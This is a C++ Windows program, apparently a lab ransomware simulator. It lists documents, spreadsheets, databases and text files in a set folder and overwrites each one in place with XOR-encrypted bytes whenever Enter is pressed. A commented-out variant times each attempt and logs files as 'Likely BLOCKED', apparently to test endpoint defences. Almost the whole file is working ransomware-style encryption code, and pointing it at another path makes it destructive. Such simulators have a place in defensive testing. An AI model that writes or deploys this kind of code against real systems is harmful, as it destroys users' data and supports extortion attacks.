#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <filesystem>

const std::string TARGET_DIR = "C:\\Users\\User\\Documents\\MalwareAnalysis\\ClipboardLogger\\Debug\\Files\\";
const std::vector<std::string> TARGET_EXTENSIONS = { ".docx", ".xlsx", ".db", ".txt" };
const BYTE XOR_KEY = 0xAA; // Demo key for XOR encryption

bool hasTargetExtension(const std::string& filename) {
	for (const auto& ext : TARGET_EXTENSIONS) {
		if (filename.length() >= ext.length() &&
			filename.compare(filename.length() - ext.length(), ext.length(), ext) == 0) {
			return true;
		}
	}
	return false;
}

void xorEncryptFile(const std::string& filepath) {
	HANDLE hFile = CreateFileA(
		filepath.c_str(),
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		std::cerr << "[-] Failed to open file: " << filepath << std::endl;
		return;
	}

	DWORD fileSize = GetFileSize(hFile, NULL);
	if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
		std::cerr << "[-] Invalid file size for: " << filepath << std::endl;
		CloseHandle(hFile);
		return;
	}

	std::vector<BYTE> buffer(fileSize);
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, buffer.data(), fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
		std::cerr << "[-] Failed to read file: " << filepath << std::endl;
		CloseHandle(hFile);
		return;
	}

	// XOR encrypt in memory
	for (DWORD i = 0; i < fileSize; ++i) {
		buffer[i] ^= XOR_KEY;
	}

	// Move pointer to start for writing
	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

	DWORD bytesWritten = 0;
	if (!WriteFile(hFile, buffer.data(), fileSize, &bytesWritten, NULL) || bytesWritten != fileSize) {
		std::cerr << "[-] Failed to write file: " << filepath << std::endl;
	}
	else {
		std::cout << "[+] Encrypted: " << filepath << std::endl;
	}

	CloseHandle(hFile);
}

void encryptFilesInDirectory(const std::string& dirPath) {
	std::string searchPath = dirPath + "*.*";
	WIN32_FIND_DATAA findData;
	HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

	if (hFind == INVALID_HANDLE_VALUE) {
		std::cerr << "[-] No files found in directory: " << dirPath << std::endl;
		return;
	}

	do {
		if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			std::string filename = findData.cFileName;
			std::string fullpath = dirPath + filename;
			if (hasTargetExtension(filename)) {
				xorEncryptFile(fullpath);
			}
		}
	} while (FindNextFileA(hFind, &findData));
	FindClose(hFind);
}

int main()
{
	std::string value;
	while (true)
	{
		// Output the current process Id
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: ";
		std::cout << GetProcessIdOfThread(currentThread);
		std::cout << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep & Encrypt files (Ctrl-C to exit): ";
		std::getline(std::cin, value);

		Beep(500, 500);

		// Call encryption routine each loop for demonstration (be careful!)
		encryptFilesInDirectory(TARGET_DIR);
	}
	return 0;
}

/*
#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <filesystem>
#include <chrono>

const std::string TARGET_DIR = "C:\\Users\\User\\Documents\\MalwareAnalysis\\ClipboardLogger\\Debug\\Files\\";
const std::vector<std::string> TARGET_EXTENSIONS = { ".docx", ".xlsx", ".db", ".txt" };
const BYTE XOR_KEY = 0xAA; // Demo key for XOR encryption

bool hasTargetExtension(const std::string& filename) {
	for (const auto& ext : TARGET_EXTENSIONS) {
		if (filename.length() >= ext.length() &&
			filename.compare(filename.length() - ext.length(), ext.length(), ext) == 0) {
			return true;
		}
	}
	return false;
}

bool xorEncryptFile(const std::string& filepath, double& durationMicroseconds) {
	auto start = std::chrono::high_resolution_clock::now(); // <-- Start timing immediately

	HANDLE hFile = CreateFileA(
		filepath.c_str(),
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		auto end = std::chrono::high_resolution_clock::now();
		std::chrono::duration<double, std::micro> duration = end - start;
		durationMicroseconds = duration.count();

		std::cerr << "[-] Failed to open file: " << filepath
			<< " (Likely BLOCKED) (Time: " << durationMicroseconds << " µs)" << std::endl;
		return false;
	}

	DWORD fileSize = GetFileSize(hFile, NULL);
	if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
		auto end = std::chrono::high_resolution_clock::now();
		std::chrono::duration<double, std::micro> duration = end - start;
		durationMicroseconds = duration.count();

		std::cerr << "[-] Invalid file size for: " << filepath
			<< " (Time: " << durationMicroseconds << " µs)" << std::endl;
		CloseHandle(hFile);
		return false;
	}

	std::vector<BYTE> buffer(fileSize);
	DWORD bytesRead = 0;
	if (!ReadFile(hFile, buffer.data(), fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
		auto end = std::chrono::high_resolution_clock::now();
		std::chrono::duration<double, std::micro> duration = end - start;
		durationMicroseconds = duration.count();

		std::cerr << "[-] Failed to read file: " << filepath
			<< " (Time: " << durationMicroseconds << " µs)" << std::endl;
		CloseHandle(hFile);
		return false;
	}

	// XOR encrypt
	for (DWORD i = 0; i < fileSize; ++i) {
		buffer[i] ^= XOR_KEY;
	}

	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

	DWORD bytesWritten = 0;
	bool success = WriteFile(hFile, buffer.data(), fileSize, &bytesWritten, NULL) && bytesWritten == fileSize;
	CloseHandle(hFile);

	auto end = std::chrono::high_resolution_clock::now();
	std::chrono::duration<double, std::micro> duration = end - start;
	durationMicroseconds = duration.count();

	if (success)
		std::cout << "[+] Encrypted: " << filepath << " (Time: " << durationMicroseconds << " µs)" << std::endl;
	else
		std::cerr << "[-] Failed to write file: " << filepath << " (Time: " << durationMicroseconds << " µs)" << std::endl;

	return success;
}


void encryptFilesInDirectory(const std::string& dirPath) {
	std::string searchPath = dirPath + "*.*";
	WIN32_FIND_DATAA findData;
	HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

	if (hFind == INVALID_HANDLE_VALUE) {
		std::cerr << "[-] No files found in directory: " << dirPath << std::endl;
		return;
	}

	int attemptCount = 0;
	double totalMicroseconds = 0.0;

	do {
		if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			std::string filename = findData.cFileName;
			std::string fullpath = dirPath + filename;

			if (hasTargetExtension(filename)) {
				double fileDuration = 0.0;
				xorEncryptFile(fullpath, fileDuration);
				totalMicroseconds += fileDuration;
				++attemptCount;
			}
		}
	} while (FindNextFileA(hFind, &findData));

	FindClose(hFind);

	if (attemptCount > 0) {
		double avgTime = totalMicroseconds / attemptCount;
		std::cout << "[*] Total files attempted: " << attemptCount << "\n";
		std::cout << "[*] Total time spent: " << totalMicroseconds << " µs\n";
		std::cout << "[*] Average time per attempt: " << avgTime << " µs\n";
	}
	else {
		std::cout << "[!] No matching files to process.\n";
	}
}

int main() {
	std::string value;
	while (true)
	{
		HANDLE currentThread = GetCurrentThread();
		std::cout << "Process id: " << GetProcessIdOfThread(currentThread) << "\n";
		CloseHandle(currentThread);

		std::cout << "Press <enter> to Beep & Encrypt files (Ctrl-C to exit): ";
		std::getline(std::cin, value);

		Beep(500, 500);

		std::cout << "[*] Attempting file encryption...\n";
		encryptFilesInDirectory(TARGET_DIR);
		std::cout << "\n";
	}
	return 0;
}

*/
